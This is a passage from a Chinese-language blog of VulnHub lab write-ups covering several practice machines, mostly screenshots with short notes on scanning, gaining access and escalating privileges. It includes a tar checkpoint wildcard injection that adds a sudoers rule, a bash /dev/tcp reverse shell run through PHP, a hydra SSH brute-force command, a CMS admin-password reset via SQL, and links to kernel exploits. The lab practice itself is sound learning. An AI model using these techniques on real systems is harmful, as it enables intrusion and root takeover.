src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093734592.png" alt="image-20210817093734592"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093753823.png" alt="image-20210817093753823"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093809318.png" alt="image-20210817093809318"></p><blockquote><p>对于npm不是特别熟悉，但是大致思路就是利用server-management的权限使用npm执行/bin/bash命令</p></blockquote><p>获取到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817094411641.png" alt="image-20210817094411641"></p><p>提权到root</p><p>下载进程监控脚本到本地</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817094850293.png" alt="image-20210817094850293"></p><p>有一个自动备份的脚本，但是不能修改内容</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817095039895.png" alt="image-20210817095039895"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> &#x27;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;server-management ALL=(root) NOPASSWD: ALL&quot;</span> &gt;&gt; <span class="hljs-string">/etc/sudoers</span>&#x27; &gt; shell.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt; <span class="hljs-string">&quot;--checkpoint=1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102735136.png" alt="image-20210817102735136"></p><p>然后等待定时任务执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102817150.png" alt="image-20210817102817150"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102530242.png" alt="image-20210817102530242"></p><p><strong>问题</strong></p><ol><li><code>shell.sh</code>中填写<code>cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash</code> 时提权不成功</li><li>对于常规漏洞的第一反应不够快，对于外网漏洞的发掘能力有待提高</li><li>对于npm的操作不熟悉</li></ol><p><strong>总结</strong></p><p>这个靶场的漏洞整体来说感觉有点难度，对于这里的提权操作也是没有见过的新方法，需要后期再研究</p><h2 id="八、Shuriken-2"><a href="#八、Shuriken-2" class="headerlink" title="八、Shuriken-2"></a>八、Shuriken-2</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.127</p></blockquote><p>扫描主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104152019.png" alt="image-20210817104152019"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104326545.png" alt="image-20210817104326545"></p><p>扫描目录没什么东西</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104626601.png" alt="image-20210817104626601"></p><p>解密session，尝试伪造Admin用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817105635375.png" alt="image-20210817105635375"></p><blockquote><p>但是伪造了Admin之后也是需要登录的</p><p>到这里就卡住了</p></blockquote><p>看了一下提示，发现原文已经给了但是英语不好没反应过来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817111146345.png" alt="image-20210817111146345"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817110847690.png" alt="image-20210817110847690"></p><blockquote><p>去学习一下node.js的漏洞再说</p><p><a href="https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/">https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/</a></p></blockquote><p><a href="https://paper.seebug.org/213/">https://paper.seebug.org/213/</a></p><p>Payload：<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125353222.png" alt="image-20210817125353222"></p><p><img src="D:\markdown\image-20210817125307007.png" alt="image-20210817125307007"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125318745.png" alt="image-20210817125318745"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125335398.png" alt="image-20210817125335398"></p><p>准备提权，查看定时任务，发现没有可以利用的，然后使用提权辅助脚本<code>linpeas.sh</code>收集信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817131903195.png" alt="image-20210817131903195"></p><blockquote><p>这里发现了一个ssh的备份文件，利用curl下载到本地</p></blockquote><p>利用john爆破出密码，先将私钥转换为john可以利用的格式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134548923.png" alt="image-20210817134548923"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134355824.png" alt="image-20210817134355824"></p><p>获取到密码后登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134619133.png" alt="image-20210817134619133"></p><p>得到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134658865.png" alt="image-20210817134658865"></p><p>继续提取到root</p><ul><li><p><del>SUID提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140109610.png" alt="image-20210817140109610"></p></li><li><p>定时任务</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140049674.png" alt="image-20210817140049674"></p></li><li><p>可能会由sudo提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817135434239.png" alt="image-20210817135434239"></p><p><code>sudo -l</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140954562.png" alt="image-20210817140954562"></p><p>查看相关配置文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817141042952.png" alt="image-20210817141042952"></p><p><code>nano shuriken-job.service</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140914238.png" alt="image-20210817140914238"></p><p>配置文件的含义<a href="https://www.xiebruce.top/925.html">https://www.xiebruce.top/925.html</a></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">Unit</span>]区块：启动顺序与依赖关系<br><br>[<span class="hljs-meta">Service</span>] 区块：启动行为<br>定义如何启动当前服务<br>ExecStart 定义启动进程时需要执行的命令<br><br></code></pre></td></tr></table></figure><p>修改服务启动时的执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143301485.png" alt="image-20210817143301485"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143705955.png" alt="image-20210817143705955"></p><p>执行命令后，获取到shell（需要给脚本赋予可执行权限）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143756012.png" alt="image-20210817143756012"></p></li></ul><p><strong>问题</strong></p><ol><li>如何识别网站是否为node.js</li><li>对于ssh的多种连接方法的熟悉不够</li><li>启动服务的具体原理不够清楚</li></ol><p>参考文章</p><p><a href="https://kielvaughn.com/Shuriken-Node/">https://kielvaughn.com/Shuriken-Node/</a></p><h2 id="九、Grotesque"><a href="#九、Grotesque" class="headerlink" title="九、Grotesque"></a>九、Grotesque</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.20</p></blockquote><p>只扫描常规端口时发现只有80，并且80也访问不了，所以扫描全部端口多了一个66</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817145132262.png" alt="image-20210817145132262"></p><blockquote><p>这个服务器没有开22 端口？ 难道又是端口碰撞？</p></blockquote><p>目录扫描没有发现有用的东西，抓取网页链接时发现一个压缩包</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817151857118.png" alt="image-20210817151857118"></p><p>压缩包中有一个sshpasswd.png图片（又是图片隐写？？？）虚晃一枪</p><blockquote><p>拿到文件看了半天也没有思路，看了一下WP，下面不知道为什么要这样干</p><p>获取文件全部内容然后排序找到有用的东西</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817153829125.png" alt="image-20210817153829125"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817153813158.png" alt="image-20210817153813158"></p><p>这个是一个wordpress的站，再次扫描一下目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817154934684.png" alt="image-20210817154934684"></p><p>使用WPscan（没发现漏洞）</p><p>回到开始，查看网页源码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817160319707.png" alt="image-20210817160319707"></p><blockquote><p>这个图片好像也没有用</p></blockquote><p>接下来找到密码的操作属实把人看懵了</p><p><a href="https://vvmlist.github.io/walkthrough/grotesque/grotesque">https://vvmlist.github.io/walkthrough/grotesque/grotesque</a></p><p>这里直接使用用户名密码登录后续操作</p><p>用户名：<code>erdalkomurcu</code></p><p>密码：<code>BC78C6AB38E114D6135409E44F7CDDA2</code></p><p>登录成功，直接在修改主题的位置写入反弹shell的脚本，获取shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817164510468.png" alt="image-20210817164510468"></p><p>在网站的配置文件中发现了一个账户和密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165318047.png" alt="image-20210817165318047"></p><p>切换用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165448061.png" alt="image-20210817165448061"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165610772.png" alt="image-20210817165610772"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817172504471.png" alt="image-20210817172504471"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817172432365.png" alt="image-20210817172432365"></p><p>利用john爆破文件密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817173944797.png" alt="image-20210817173944797"></p><p><a href="https://app.keeweb.info/">https://app.keeweb.info/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817173903992.png" alt="image-20210817173903992"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817174014622.png" alt="image-20210817174014622"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817174039870.png" alt="image-20210817174039870"></p><p><strong>问题</strong></p><ol><li>对于kdbx文件的不了解</li></ol><p><strong>总结</strong></p><p>这个网站外网部分的脑洞比较大，到了找网站后台密码的时候就有点反应不过来了，然后就是对于一些文件后缀的不了解，容易错过重要文件</p><h2 id="十、Grotesque2"><a href="#十、Grotesque2" class="headerlink" title="十、Grotesque2"></a>十、Grotesque2</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.21</p></blockquote><p>扫描端口发现这个服务器开了几百个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818095932921.png" alt="image-20210818095932921"></p><p>扫描网站目录也没有扫描发现</p><p>直接拿出珍藏多年的端口扫描器，批量扫描多个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818101559750.png" alt="image-20210818101559750"></p><p>结果发现258端口返回的大小和其他的不一样</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818101659638.png" alt="image-20210818101659638"></p><blockquote><p>看起来是要我们爆破ssh</p></blockquote><p>使用hydra爆破，爆破了很久，没有出来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818110014993.png" alt="image-20210818110014993"></p><p>看了一下WP，发现一个离谱的东西，密码在手指上面<code>b6e705ea1249e2bb7b0fd7dac9fcd1b3</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818104721912.png" alt="image-20210818104721912"></p><p>解密出密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105008952.png" alt="image-20210818105008952"></p><p>然后挨个尝试用户名登录，成功使用<code>angel</code>登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105302414.png" alt="image-20210818105302414"></p><p>获取到一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105415519.png" alt="image-20210818105415519"></p><p>提权到root，监控进程发现有个定时任务，但是没有权限修改</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818110536001.png" alt="image-20210818110536001"></p><p>提权辅助脚本 <code>linpeas.sh</code>运行不了，但是<code>LinEnum.sh</code>可以运行，但是也没有发现什么东西</p><blockquote><p>解决linpeas.sh不能运行的原因是不同系统的换行符不一样</p><p>通过vi/vim进入想要修改的文件，按下<code>:</code>进入末行模式，输入<code>set fileformat=unix</code>然后退出即可</p></blockquote><p>看了一下wp，发现这个定时任务会定时写入密码到根目录，但是本地没有看见</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113323440.png" alt="image-20210818113323440"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113306024.png" alt="image-20210818113306024"></p><p>看了一下定时执行的文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113614313.png" alt="image-20210818113614313"></p><p>将本地quiet文件清空之后才会在根目录写入文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113950755.png" alt="image-20210818113950755"></p><blockquote><p>这个纯脑洞了</p></blockquote><p>参考文章</p><p><a href="https://www.mondayice.com/2021/06/03/vulnhub-grotesque2-writeup/">https://www.mondayice.com/2021/06/03/vulnhub-grotesque2-writeup/</a></p><h2 id="十一、Shenron"><a href="#十一、Shenron" class="headerlink" title="十一、Shenron"></a>十一、Shenron</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.22</p></blockquote><p>中规中矩的开放了两个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818124158708.png" alt="image-20210818124158708"></p><p>扫描一下目录，访问一下发现也是<code>joomla</code>框架，网上寻找以及存在的漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818130358222.png" alt="image-20210818130358222"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818130336047.png" alt="image-20210818130336047"></p><p> <img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818131204412.png" alt="image-20210818131204412"></p><p>成功登录后台，在后台模板修改处写入木马</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818131739088.png" alt="image-20210818131739088"></p><p>上传反弹shell的脚本，然后获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132014354.png" alt="image-20210818132014354"></p><p>在配置文件中获取到一个用户的密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132346703.png" alt="image-20210818132346703"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132636520.png" alt="image-20210818132636520"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132836615.png" alt="image-20210818132836615"></p><blockquote><p>可以利用cp将ssh文件复制到这个用户的.ssh文件中实现使用密钥登录</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818134922962.png" alt="image-20210818134922962"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818134736523.png" alt="image-20210818134736523"></p><p>获得一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135200504.png" alt="image-20210818135200504"></p><p>利用密钥<code>scp</code>文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135538855.png" alt="image-20210818135538855"></p><p>使用<code>pspy64</code>监控进程没有发现特殊的东西</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135839321.png" alt="image-20210818135839321"></p><p>使用辅助提权脚本<code>linpeas.sh</code>扫描一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818140751728.png" alt="image-20210818140751728"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818140909918.png" alt="image-20210818140909918"></p><p>列出自己的权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141136095.png" alt="image-20210818141136095"></p><p>使用apt提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">执行命令：sudo apt changelog apt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141645808.png" alt="image-20210818141645808"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141559490.png" alt="image-20210818141559490"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141509574.png" alt="image-20210818141509574"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141537570.png" alt="image-20210818141537570"></p><p><strong>问题</strong></p><ol><li><p>在用户<code>/home/jenny</code>的目录下直接复制文件一直不成功，到<code>tmp</code>目录下就可以了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135103119.png" alt="image-20210818135103119"></p></li></ol><p><strong>总结</strong></p><p>这个外网相对简单，主机提权的之前用户的提权是常规的，最后的apt提权是新手法之前总结没有发现这个东西</p><p>参考文章</p><p><a href="https://nepcodex.com/2021/06/shenron-1-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/shenron-1-walkthrough-vulnhub-writeup/</a></p><h2 id="十二、VulnCMS"><a href="#十二、VulnCMS" class="headerlink" title="十二、VulnCMS"></a>十二、VulnCMS</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.23</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818143156065.png" alt="image-20210818143156065"></p><blockquote><p>每个端口都有不同的CMS</p></blockquote><p>80端口<code>w3.css</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145137572.png" alt="image-20210818145137572"></p><p>5000端口 <code>wordpress</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145152326.png" alt="image-20210818145152326"></p><p>8081端口<code>joomla</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145230133.png" alt="image-20210818145230133"></p><p>9001端口<code>Drupal</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145318575.png" alt="image-20210818145318575"></p><p>在漏洞库找到一些漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818150304048.png" alt="image-20210818150304048"></p><p><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-6920)/">Drupal - 白阁文库</a></p><p>POC&amp;EXP <a href="https://github.com/zhzyker/exphub/tree/master/drupal">https://github.com/zhzyker/exphub/tree/master/drupal</a></p><p>执行POC检查漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818151606122.png" alt="image-20210818151606122"></p><p>执行EXP，但是没有效果</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818151825622.png" alt="image-20210818151825622"></p><p>使用MSF获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818152555291.png" alt="image-20210818152555291"></p><p>看到了joomlaCMS的用户名和密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818153820771.png" alt="image-20210818153820771"></p><blockquote><p>:cry:  为什么这个密码不对啊，真正的密码在这个里面，这个文件有什么特殊的呢？？？</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818154020985.png" alt="image-20210818154020985"></p><p>登录<code>joomla</code>后台之后不能按照以前的方法获取到shell，卡住了…… </p><p>为什么用户邮箱会联想到密码………………</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155116079.png" alt="image-20210818155116079"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155032435.png" alt="image-20210818155032435"></p><p>获取到flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155144741.png" alt="image-20210818155144741"></p><p>监控进程发现没有定时脚本执行，使用提权辅助脚本扫描</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818160300843.png" alt="image-20210818160300843"></p><blockquote><p>这里如果换到ghost用户可能可以使用lxd提权</p></blockquote><p>找到了一个用户，可能会有密码存在</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162324252.png" alt="image-20210818162324252"></p><p>读取文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162419611.png" alt="image-20210818162419611"></p><p>成功切换用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162455942.png" alt="image-20210818162455942"></p><p>查看可以使用sudo执行的命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162552860.png" alt="image-20210818162552860"></p><p>提权到root</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162656056.png" alt="image-20210818162656056"></p><p>获取到最后一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162723639.png" alt="image-20210818162723639"></p><p><strong>总结</strong></p><p>在遇见多个CMS的时候需要查找CMS的历史漏洞尝试攻击，还需要自己动手发现，对于获取到的信息需要细心查看不要忽略</p><p>参考文章</p><p><a href="https://nepcodex.com/2021/06/vulncms-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/vulncms-walkthrough-vulnhub-writeup/</a></p><h2 id="十三、POTATO"><a href="#十三、POTATO" class="headerlink" title="十三、POTATO"></a>十三、POTATO</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.24</p></blockquote><p>扫描端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095443334.png" alt="image-20210819095443334"></p><blockquote><p>7120端口开放但是并不能直接访问到</p></blockquote><p>仔细扫描后发现7120是ssh端口<code>sudo nmap -sSV -vv -sC -T4 -p- 192.168.1.24</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819100445429.png" alt="image-20210819100445429"></p><p>扫描一下目录，发现了一个phpinfo的目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095559065.png" alt="image-20210819095559065"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095627149.png" alt="image-20210819095627149"></p><blockquote><p>看到PHPINFO的界面，想到了本地文件包含</p></blockquote><p>没有在phpinfo中看到有用的信息，思路断了……，作者给出了HINT</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819101146263.png" alt="image-20210819101146263"></p><p>尝试使用<code>potato</code>爆破ssh密码</p><p><code>hydra 192.168.1.24 ssh -s 7120 -p potato -P /usr/share/worldlists/rockyou.txt -t 6 -v -f</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819102656060.png" alt="image-20210819102656060"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819102754034.png" alt="image-20210819102754034"></p><p>提权</p><p>使用pspy64监控进程，并没有发现特殊情况</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819103627063.png" alt="image-20210819103627063"></p><p><code>linpeas.sh</code>辅助提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819104309153.png" alt="image-20210819104309153"></p><p>内核漏洞提权，先使用脚本扫描一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819105331542.png" alt="image-20210819105331542"></p><blockquote><p>脏牛本地提权：<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p></blockquote><p>这个漏洞不行，开始执行主机就崩掉了，换一个</p><p>使用CVE-2015-1328  EXP下载：<a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819112403241.png" alt="image-20210819112403241"></p><p>提权成功</p><p><strong>总结</strong></p><p>这个靶场直接绕过外网爆破ssh有点难顶，对于内核提权漏洞，脏牛直接把电脑打崩了这个有点意外，网上没看见这个情况，其他还行都是常规步骤</p><h2 id="十四、BOVERFLOW"><a href="#十四、BOVERFLOW" class="headerlink" title="十四、BOVERFLOW"></a><del>十四、BOVERFLOW</del></h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.25</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819123723015.png" alt="image-20210819123723015"></p><p>端口开放情况</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819113326332.png" alt="image-20210819113326332"></p><p>扫描目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819114205992.png" alt="image-20210819114205992"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819114148419.png" alt="image-20210819114148419"></p><blockquote><p>居然还封我ip</p></blockquote><p>思路卡住了，动不了了</p><h2 id="十四、DevContainer"><a href="#十四、DevContainer" class="headerlink" title="十四、DevContainer"></a>十四、DevContainer</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.26</p></blockquote><p>这只开放了80端口，扫描目录发现有个upload页面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819125856482.png" alt="image-20210819125856482"></p><p>直接在<code>/upload</code>下上传即可，并没有任何限制</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819130359077.png" alt="image-20210819130359077"></p><p>利用网站中的定时脚本反弹shell</p><blockquote><p>之前使用 cp /bin/bash /tmp/bash 失败应该是权限不够，所以直接尝试反弹shell</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132019403.png" alt="image-20210819132019403"></p><p>查看有权限执行的命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132313762.png" alt="image-20210819132313762"></p><p>这个是一个本地端口转发的命令，将90端口转发到8080端口，之后再端口的地方发现一个文件读取漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132846728.png" alt="image-20210819132846728"></p><p>反弹shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133350657.png" alt="image-20210819133350657"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133404477.png" alt="image-20210819133404477"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133438221.png" alt="image-20210819133438221"></p><p><strong>总结</strong></p><p>通过这个平台更加深了我对权限的理解，对于各个服务开启的用户是什么权限，执行命令的就是什么权限</p><h2 id="十五、MY-CMSMS"><a href="#十五、MY-CMSMS" class="headerlink" title="十五、MY CMSMS"></a>十五、MY CMSMS</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.27</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819140138106.png" alt="image-20210819140138106"></p><p>扫描目录，对网站观察以一番，但是没有发现前台有什么漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144813495.png" alt="image-20210819144813495"></p><p>但是这个可以利用弱口令远程连接数据库……</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819143920428.png" alt="image-20210819143920428"></p><p>更新用户密码</p><p><a href="http://blog.is36.com/archives/447/">CMS Made Simple忘记密码</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> cms_users <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> = (<span class="hljs-keyword">select</span> <span class="hljs-keyword">md5</span>(<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">IFNULL</span>((<span class="hljs-keyword">SELECT</span> sitepref_value <span class="hljs-keyword">FROM</span> cms_siteprefs <span class="hljs-keyword">WHERE</span> sitepref_name = <span class="hljs-string">&#x27;sitemask&#x27;</span>),<span class="hljs-string">&#x27;&#x27;</span>),<span class="hljs-string">&#x27;admin&#x27;</span>))) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819143602387.png" alt="image-20210819143602387"></p><p>为什么要这么更新密码呢？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144351232.png" alt="image-20210819144351232"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144420874.png" alt="image-20210819144420874"></p><blockquote><p>这个网站的密码还在前面添加了前缀，所以我们不能直接修改密码，还需要添加上相应的字符前缀</p></blockquote><p>后台执行php代码反弹shell</p><p><code>system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.1.15/1234 0&gt;&amp;1&#39;&quot;);</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819150528510.png" alt="image-20210819150528510"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819150542954.png" alt="image-20210819150542954"></p><p>看到了两个备份文件，使用john来破解加密的密码</p><p><img 